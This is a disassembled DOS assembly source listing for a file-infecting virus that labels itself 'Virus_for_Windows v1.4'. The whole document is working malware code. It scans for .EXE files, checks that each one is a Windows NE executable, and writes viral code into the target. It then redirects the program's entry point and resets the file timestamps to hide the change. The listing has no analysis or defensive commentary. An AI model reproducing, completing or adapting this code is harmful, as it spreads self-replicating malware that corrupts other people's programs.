
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€					                                 €€
;€€				WVIR14	                                 €€
;€€					                                 €€
;€€      Created:   1-Sep-92		                                 €€
;€€      Passes:    5          Analysis	Options on: none                 €€
;€€					                                 €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_11e	equ	100h			;*
data_12e	equ	140h			;*
data_13e	equ	142h			;*
data_14e	equ	144h			;*
data_15e	equ	148h			;*
data_16e	equ	14Ah			;*
data_17e	equ	150h			;*
data_18e	equ	16Eh			;*
data_19e	equ	181h			;*
data_20e	equ	19Ch			;*
data_21e	equ	19Eh			;*
data_22e	equ	1A0h			;*
data_23e	equ	1A2h			;*

;------------------------------------------------------------  seg_a   ----

seg_a		segment	byte public
		assume cs:seg_a  , ds:seg_a  , ss:stack_seg_b

		db	249 dup (0)

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       Program	Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€


wvir14		proc	far

start:
		mov	ax,cs
		add	ax,3Bh
		mov	ds,ax
		cld				; Clear direction
		push	es
		push	ds
		pop	es
		mov	si,data_18e
		mov	di,data_19e
		mov	cx,0Dh
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	dx,data_17e
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	dx,17Bh
		xor	cx,cx			; Zero register
		mov	ah,4Eh
loc_1:
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jc	loc_2			; Jump if carry Set
		mov	dx,data_18e
		call	sub_1
		mov	ah,4Fh			; 'O'
		jmp	short loc_1
loc_2:
		mov	dx,data_19e
		call	sub_2
		pop	es
		mov	ax,4C00h
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code

wvir14		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_ret_4		; Jump if carry Set
		xchg	ax,bx
		mov	si,100h
		call	sub_3
		jc	loc_3			; Jump if carry Set
		cmp	word ptr [si+14h],100h
		je	loc_3			; Jump if equal
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		push	cx
		push	dx
		call	sub_4
		pop	dx
		pop	cx
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
loc_3:
		mov	ah,3Eh
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle

loc_ret_4:
		retn
sub_1		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_ret_4		; Jump if carry Set
		xchg	ax,bx
		mov	si,100h
		call	sub_3
		jc	loc_3			; Jump if carry Set
		cmp	word ptr [si+14h],100h
		jne	loc_3			; Jump if not equal
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		push	cx
		push	dx
		call	sub_5
		call	sub_6
		pop	dx
		pop	cx
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		jmp	short loc_3
sub_2		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3		proc	near
		call	sub_8
		cmp	word ptr [si],5A4Dh
		jne	loc_5			; Jump if not equal
		cmp	word ptr [si+18h],40h
		jb	loc_5			; Jump if below
		mov	ax,[si+3Ch]
		mov	dx,[si+3Eh]
		call	sub_16
		mov	ds:data_20e,ax
		mov	ds:data_21e,dx
		call	sub_8
		cmp	word ptr [si],454Eh
		jne	loc_5			; Jump if not equal
		cmp	word ptr [si+0Ch],302h
		jne	loc_5			; Jump if not equal
		cmp	byte ptr [si+32h],4
		jne	loc_5			; Jump if not equal
		cmp	word ptr [si+36h],802h
		jne	loc_5			; Jump if not equal
		clc				; Clear carry flag
		retn
loc_5:
		stc				; Set carry flag

loc_ret_6:
		retn
sub_3		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		mov	ax,[si+16h]
		mov	dx,140h
		call	sub_7
		cmp	word ptr ds:data_13e,3AEh
		jb	loc_ret_6		; Jump if below
		cmp	byte ptr ds:data_14e,50h	; 'P'
		jne	loc_ret_6		; Jump if not equal
		mov	ax,[si+0Eh]
		mov	dx,148h
		call	sub_7
		cmp	word ptr ds:data_16e,4A8h
		jb	loc_ret_6		; Jump if below
		mov	ax,ds:data_12e
		call	sub_15
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_9
		call	sub_13
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_12
		mov	ax,word ptr ds:[148h]
		call	sub_15
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_9
		call	sub_13
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_12
		push	word ptr ds:[144h]
		pop	word ptr ds:[1A2h]
		and	word ptr ds:[144h],0FEFFh
		mov	ax,[si+16h]
		mov	dx,140h
		call	sub_10
		xor	ax,ax			; Zero register
		cwd				; Word to double word
		call	sub_14
		push	word ptr [si+14h]
		pop	word ptr ds:[1A0h]
		mov	word ptr [si+14h],100h
		call	sub_11
		mov	ax,word ptr ds:[140h]
		call	sub_15
		push	ds
		push	cs
		pop	ds
		mov	dx,100h
		mov	cx,2AEh
		nop
		call	sub_12
		pop	ds
		mov	ax,word ptr ds:[148h]
		call	sub_15
		mov	dx,100h
		mov	cx,0A8h
		nop
		call	sub_12
		retn
sub_4		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_5		proc	near
		mov	ax,[si+0Eh]
		mov	dx,148h
		call	sub_7
		mov	ax,ds:data_15e
		call	sub_15
		mov	dx,100h
		mov	cx,0A8h
		nop
		call	sub_9
		retn
sub_5		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6		proc	near
		push	word ptr ds:data_23e
		pop	word ptr ds:data_14e
		mov	ax,[si+16h]
		mov	dx,140h
		call	sub_10
		push	word ptr ds:data_22e
		pop	word ptr [si+14h]
		xor	ax,ax			; Zero register
		cwd				; Word to double word
		call	sub_14
		call	sub_11
		call	sub_13
		sub	ax,0A8h
		nop
		sbb	dx,0
		push	ax
		push	dx
		call	sub_16
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_9
		mov	ax,ds:data_15e
		call	sub_15
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_12
		pop	dx
		pop	ax
		sub	ax,2AEh
		nop
		sbb	dx,0
		push	ax
		push	dx
		call	sub_16
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_9
		mov	ax,word ptr ds:[140h]
		call	sub_15
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_12
		pop	dx
		pop	ax
		call	sub_16
		mov	cx,0
		call	sub_12
		retn
sub_6		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_7		proc	near
		push	dx
		dec	ax
		mov	cx,8
		mul	cx			; dx:ax = reg * ax
		add	ax,[si+22h]
		adc	dx,0
		call	sub_14
		pop	dx
		mov	cx,8
		jmp	short loc_7

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_8:
		mov	dx,data_11e
		mov	cx,40h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_9:
loc_7:
		mov	ah,3Fh
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		retn
sub_7		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_10		proc	near
		push	dx
		dec	ax
		mov	cx,8
		mul	cx			; dx:ax = reg * ax
		add	ax,[si+22h]
		adc	dx,0
		call	sub_14
		pop	dx
		mov	cx,8
		jmp	short loc_8

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_11:
		mov	dx,data_11e
		mov	cx,40h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_12:
loc_8:
		mov	ah,40h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		retn
sub_10		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_13		proc	near
		mov	ax,4202h
		xor	cx,cx			; Zero register
		cwd				; Word to double word
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		retn
sub_13		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_14		proc	near
		add	ax,ds:data_20e
		adc	dx,ds:data_21e
		jmp	short loc_9

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_15:
		mov	cx,10h
		mul	cx			; dx:ax = reg * ax
		add	ax,100h
		adc	dx,0
		jmp	short loc_9
		db	 33h,0C0h, 99h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_16:
loc_9:
		xchg	cx,dx
		xchg	ax,dx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		retn
sub_14		endp

			                        ;* No entry point to code
		xchg	cx,dx
		xchg	ax,dx
		mov	ax,4201h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		retn
		db	' Virus_for_Windows  v1.4 '
		db	259 dup (0)
		db	'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
		db	'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
		db	'bbbbbbbbccccccccdddddddddddddddd'
		db	'ddddddddddddddddddddddddddd*.EXE'
		db	0
		db	'eeeeeeeeeeeee'
		db	 00h, 00h, 80h, 00h, 00h, 00h
		db	 5Ch, 00h, 00h, 00h
		db	6Ch
		db	11 dup (0)
		db	 4Dh, 4Bh, 39h, 32h
		db	8 dup (0)

seg_a		ends



;------------------------------------------------------  stack_seg_b   ----

stack_seg_b	segment	word stack 'STACK'

		db	8192 dup (0)

stack_seg_b	ends



		end	start
